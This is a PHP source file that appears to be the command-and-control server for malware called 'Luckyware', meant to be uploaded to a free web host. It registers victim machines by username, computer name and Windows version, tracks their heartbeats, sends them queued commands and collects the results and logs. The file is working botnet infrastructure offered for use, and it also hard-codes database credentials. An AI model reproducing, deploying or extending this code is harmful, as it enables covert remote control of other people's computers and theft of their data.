<?php
// Luckyware C&C Server API
// Upload this to your InfinityFree website root directory

header('Content-Type: text/plain');
error_reporting(0);

// Database configuration - MySQL (InfinityFree)
$db_host = 'sql113.infinityfree.com';
$db_name = 'if0_43071029_luckyware';  // CHANGE THIS to your actual database name
$db_user = 'if0_43071029';
$db_pass = '77oUN0U6Fp';
$db_port = 3306;

// Connect to database
$conn = @new mysqli($db_host, $db_user, $db_pass, $db_name, $db_port);
if ($conn->connect_error) {
    die("db_error");
}
$conn->set_charset("utf8mb4");

// Get action
$action = isset($_GET['action']) ? $_GET['action'] : '';

// Get POST data
$client_id = isset($_POST['client_id']) ? $conn->real_escape_string($_POST['client_id']) : '';

switch($action) {
    case 'register':
        // Register new client
        $username = isset($_POST['username']) ? $conn->real_escape_string($_POST['username']) : 'Unknown';
        $computer_name = isset($_POST['computer_name']) ? $conn->real_escape_string($_POST['computer_name']) : 'Unknown';
        $windows_version = isset($_POST['windows_version']) ? $conn->real_escape_string($_POST['windows_version']) : 'Unknown';
        
        // Check if client already exists
        $result = $conn->query("SELECT id FROM clients WHERE client_id = '$client_id'");
        
        if($result && $result->num_rows == 0) {
            // Insert new client
            $conn->query("INSERT INTO clients (client_id, username, computer_name, windows_version, first_seen, last_seen, status) VALUES ('$client_id', '$username', '$computer_name', '$windows_version', NOW(), NOW(), 'online')");
            echo "success:registered";
        } else {
            // Update existing client
            $conn->query("UPDATE clients SET last_seen = NOW(), status = 'online' WHERE client_id = '$client_id'");
            echo "success:updated";
        }
        break;
        
    case 'heartbeat':
        // Update last seen
        if(!empty($client_id)) {
            $conn->query("UPDATE clients SET last_seen = NOW(), status = 'online' WHERE client_id = '$client_id'");
            echo "success:heartbeat";
        }
        break;
        
    case 'get_commands':
        // Get pending commands for this client
        if(!empty($client_id)) {
            $result = $conn->query("SELECT id, command_type, command_data FROM commands WHERE client_id = '$client_id' AND status = 'pending' ORDER BY created_at ASC LIMIT 1");
            
            if($result && $row = $result->fetch_assoc()) {
                // Mark command as executing
                $conn->query("UPDATE commands SET status = 'executing', executed_at = NOW() WHERE id = " . $row['id']);
                
                // Return command in format: command_id|command_type|command_data
                echo $row['id'] . '|' . $row['command_type'] . '|' . $row['command_data'];
            } else {
                echo "no_commands";
            }
        }
        break;
        
    case 'submit_result':
        // Submit command result
        $command_id = isset($_POST['command_id']) ? intval($_POST['command_id']) : 0;
        $result_data = isset($_POST['result']) ? $conn->real_escape_string($_POST['result']) : '';
        
        if($command_id > 0) {
            $conn->query("UPDATE commands SET status = 'completed', result = '$result_data' WHERE id = $command_id");
            echo "success:result_submitted";
        }
        break;
        
    case 'submit_log':
        // Submit log entry
        $log_type = isset($_POST['log_type']) ? $conn->real_escape_string($_POST['log_type']) : 'info';
        $message = isset($_POST['message']) ? $conn->real_escape_string($_POST['message']) : '';
        
        if(!empty($client_id) && !empty($message)) {
            $conn->query("INSERT INTO logs (client_id, log_type, message, created_at) VALUES ('$client_id', '$log_type', '$message', NOW())");
            echo "success:log_submitted";
        }
        break;
        
    default:
        echo "invalid_action";
        break;
}

$conn->close();
?>
